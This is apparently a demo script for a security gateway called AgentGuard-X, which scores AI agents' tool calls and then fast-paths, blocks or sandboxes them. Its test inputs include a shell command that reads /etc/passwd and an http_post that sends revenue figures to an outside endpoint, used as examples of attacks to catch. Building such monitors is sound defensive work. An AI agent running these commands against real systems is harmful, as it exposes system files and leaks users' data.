"""
AgentGuard-X PoC v1.1 — Demo Runner

Executes all three demonstration flows sequentially:
  Flow 1: Clean → FAST_PATH
  Flow 2: Instant Kill → BLOCK
  Flow 3: Ambiguous → SANDBOX → Verdict
"""
import json
import sys
import os
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import requests

from config import TRIAGE_SERVICE_URL
from gateway.langchain_hook import ToolBlockedException

GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"
DIM    = "\033[2m"


def check_health() -> bool:
    print(f"\n{BOLD}{CYAN}=== AgentGuard-X Health Check ==={RESET}")
    try:
        resp = requests.get(TRIAGE_SERVICE_URL + "/health", timeout=5)
        health = resp.json()
        print(json.dumps(health, indent=2))
        components = health.get("components", {})
        all_ok = all(components.values())
        if not all_ok:
            down = [k for k, v in components.items() if not v]
            print(f"{YELLOW}Warning: Components not ready: {down}{RESET}")
            print(f"{YELLOW}Proceeding anyway — some flows may degrade gracefully.{RESET}")
        else:
            print(f"{GREEN}All components healthy.{RESET}")
        return True
    except requests.exceptions.ConnectionError:
        print(f"{RED}ERROR: Triage service not running at {TRIAGE_SERVICE_URL}{RESET}")
        print(f"{RED}Start the service first: uvicorn triage.main:app --port 8000{RESET}")
        return False


def _triage_direct(tool_name: str, tool_input: dict, tool_input_raw: str,
                   agent_id: str = "research_agent_001",
                   agent_role: str = "research_agent",
                   session_id: str = "demo-session-001") -> dict:
    """Call triage endpoint directly for demo display."""
    payload = {
        "agent_id": agent_id,
        "session_id": session_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "tool_input_raw": tool_input_raw,
        "agent_role": agent_role,
        "timestamp": time.time(),
        "request_id": str(uuid.uuid4()),
    }
    resp = requests.post(TRIAGE_SERVICE_URL + "/triage", json=payload, timeout=30)
    resp.raise_for_status()
    return resp.json()


def _print_response(response: dict) -> None:
    print(f"\n{DIM}--- Full TriageResponse ---{RESET}")
    # Pretty print key fields
    print(f"  request_id      : {response.get('request_id', '')[:16]}...")
    print(f"  routing_decision: {BOLD}{response.get('routing_decision')}{RESET}")
    print(f"  final_score     : {response.get('final_score')}")
    print(f"  instant_kill    : {response.get('instant_kill')}")
    print(f"  processing_ms   : {response.get('processing_time_ms')}ms")
    print(f"  owasp_category  : {response.get('owasp_category')}")
    print(f"\n  {BOLD}Stage Results:{RESET}")
    for sr in response.get("stage_results", []):
        skipped = sr.get("details", {}).get("skipped", False)
        icon = "⏭ " if skipped else ("❌" if sr.get("triggered") else "✅")
        print(f"    Stage {sr.get('stage')}: {icon} score={sr.get('score'):.2f} — {sr.get('reason')[:70]}")
    print(f"\n  {BOLD}Explanation:{RESET}")
    print(f"  {response.get('explanation', '')}")


def flow1_clean_fast_path():
    print(f"\n{'=' * 60}")
    print(f"{BOLD}{GREEN}FLOW 1: Clean Request → FAST PATH{RESET}")
    print(f"{'=' * 60}")
    print("Tool: web_search | Input: 'latest AI research papers'")
    print("Expected: score < 0.30 → FAST_PATH → executes normally\n")

    try:
        response = _triage_direct(
            tool_name="web_search",
            tool_input={"query": "latest AI research papers"},
            tool_input_raw="latest AI research papers",
        )
        decision = response.get("routing_decision")
        score = response.get("final_score")
        elapsed = response.get("processing_time_ms")

        if decision == "FAST_PATH":
            print(f"{GREEN}[AgentGuard-X] ✅ FAST PATH | score: {score:.2f} | tool: web_search | {elapsed:.1f}ms{RESET}")
        else:
            print(f"{YELLOW}[AgentGuard-X] Unexpected decision: {decision} | score: {score:.2f}{RESET}")

        _print_response(response)

    except Exception as e:
        print(f"{RED}Flow 1 error: {e}{RESET}")


def flow2_instant_kill():
    print(f"\n{'=' * 60}")
    print(f"{BOLD}{RED}FLOW 2: Dangerous Command → INSTANT KILL{RESET}")
    print(f"{'=' * 60}")
    print("Tool: execute_shell | Input: 'cat /etc/passwd'")
    print("Expected: Stage 2 instant-kill → BLOCK in < 2ms\n")

    try:
        t0 = time.time()
        response = _triage_direct(
            tool_name="execute_shell",
            tool_input={"command": "cat /etc/passwd"},
            tool_input_raw="cat /etc/passwd",
        )
        elapsed = (time.time() - t0) * 1000

        decision = response.get("routing_decision")
        score = response.get("final_score")
        instant_kill = response.get("instant_kill")
        proc_ms = response.get("processing_time_ms")

        kill_tag = " | INSTANT KILL" if instant_kill else ""
        stage2 = next((sr for sr in response.get("stage_results", []) if sr.get("stage") == 2), None)
        stage2_detail = ""
        if stage2:
            best = stage2.get("details", {}).get("best_pattern", "")
            weight = stage2.get("details", {}).get("best_weight", 0)
            stage2_detail = f" | Stage 2: '{best}' matched (weight {weight})"

        if decision == "BLOCK":
            print(f"{RED}[AgentGuard-X] 🚫 BLOCKED | score: {score:.1f} | tool: execute_shell{kill_tag}{stage2_detail} | {proc_ms:.1f}ms{RESET}")
        else:
            print(f"{YELLOW}[AgentGuard-X] Unexpected decision: {decision}{RESET}")

        _print_response(response)

    except Exception as e:
        print(f"{RED}Flow 2 error: {e}{RESET}")


def flow3_sandbox():
    print(f"\n{'=' * 60}")
    print(f"{BOLD}{YELLOW}FLOW 3: Ambiguous Multi-Step → SANDBOX → Verdict{RESET}")
    print(f"{'=' * 60}")
    print("Step A: read_file('report.txt') → possibly FAST_PATH or SANDBOX")
    print("Step B: http_post(external_url, data) → Stage 5 detects read→post sequence → SANDBOX")
    print("Expected: Docker sandbox fires, behavioral fingerprint collected, verdict returned\n")

    # Step A: read_file
    print(f"{DIM}--- Step A: read_file ---{RESET}")
    try:
        resp_a = _triage_direct(
            tool_name="read_file",
            tool_input={"filepath": "report.txt"},
            tool_input_raw="report.txt",
        )
        print(f"read_file → {resp_a.get('routing_decision')} | score: {resp_a.get('final_score'):.2f} | {resp_a.get('processing_time_ms'):.1f}ms")
    except Exception as e:
        print(f"{RED}Step A error: {e}{RESET}")
        return

    # Step B: http_post — should trigger drift detection
    print(f"\n{DIM}--- Step B: http_post (exfiltration candidate) ---{RESET}")
    try:
        resp_b = _triage_direct(
            tool_name="http_post",
            tool_input={"url": "https://external-endpoint.com/collect", "data": "Q3 Revenue: $2.4M"},
            tool_input_raw="https://external-endpoint.com/collect Q3 Revenue: $2.4M",
        )
        decision = resp_b.get("routing_decision")
        score = resp_b.get("final_score")
        proc_ms = resp_b.get("processing_time_ms")

        stage5 = next((sr for sr in resp_b.get("stage_results", []) if sr.get("stage") == 5), None)
        drift_detail = ""
        if stage5 and stage5.get("triggered"):
            drift_detail = f" | Behavioral drift: {stage5.get('reason', '')[:60]}"

        print(f"{YELLOW}[AgentGuard-X] 🔶 {decision} | score: {score:.2f} | tool: http_post{drift_detail} | {proc_ms:.1f}ms{RESET}")

        _print_response(resp_b)

        if decision == "SANDBOX":
            print(f"\n{YELLOW}[AgentGuard-X] Docker execution started...{RESET}")
            from sandbox import docker_runner
            from review import queue as review_queue
            from triage.models import TriageResponse

            try:
                verdict = docker_runner.execute_in_sandbox(
                    "http_post",
                    {"url": "https://external-endpoint.com/collect", "data": "Q3 Revenue: $2.4M"},
                )
                color = RED if verdict.verdict == "KILL" else GREEN
                print(f"{color}[AgentGuard-X] Sandbox verdict: {verdict.verdict}{RESET}")
                print(f"  Reason    : {verdict.reason}")
                print(f"  Exec time : {verdict.execution_ms:.1f}ms")
                print(f"  Fingerprint: {json.dumps(verdict.fingerprint, indent=4)}")

                # Enqueue for review
                try:
                    tr = TriageResponse(**resp_b)
                    enqueued = review_queue.enqueue(tr)
                    if enqueued:
                        print(f"\n{CYAN}[AgentGuard-X] Request enqueued for human review.{RESET}")
                except Exception as eq_e:
                    print(f"{YELLOW}Warning: Could not enqueue for review: {eq_e}{RESET}")

            except Exception as docker_err:
                print(f"{YELLOW}[AgentGuard-X] Docker not available: {docker_err}{RESET}")
                print(f"{YELLOW}[AgentGuard-X] Sandbox verdict: KILL (Docker daemon unreachable — fail-closed){RESET}")
                try:
                    tr = TriageResponse(**resp_b)
                    review_queue.enqueue(tr)
                    print(f"{CYAN}[AgentGuard-X] Request enqueued for human review.{RESET}")
                except Exception:
                    pass

    except Exception as e:
        print(f"{RED}Step B error: {e}{RESET}")


def print_final_stats():
    print(f"\n{'=' * 60}")
    print(f"{BOLD}{CYAN}=== AgentGuard-X Session Statistics ==={RESET}")
    try:
        resp = requests.get(TRIAGE_SERVICE_URL + "/stats", timeout=5)
        stats = resp.json()
        print(json.dumps(stats, indent=2))
    except Exception as e:
        print(f"{YELLOW}Could not fetch stats: {e}{RESET}")


if __name__ == "__main__":
    print(f"\n{BOLD}{CYAN}{'=' * 60}{RESET}")
    print(f"{BOLD}{CYAN}  AgentGuard-X PoC v1.1 — Decision Perimeter Demo{RESET}")
    print(f"{BOLD}{CYAN}{'=' * 60}{RESET}")

    if not check_health():
        sys.exit(1)

    flow1_clean_fast_path()
    time.sleep(0.5)

    flow2_instant_kill()
    time.sleep(0.5)

    flow3_sandbox()

    print_final_stats()

    print(f"\n{BOLD}{GREEN}Demo complete.{RESET}\n")
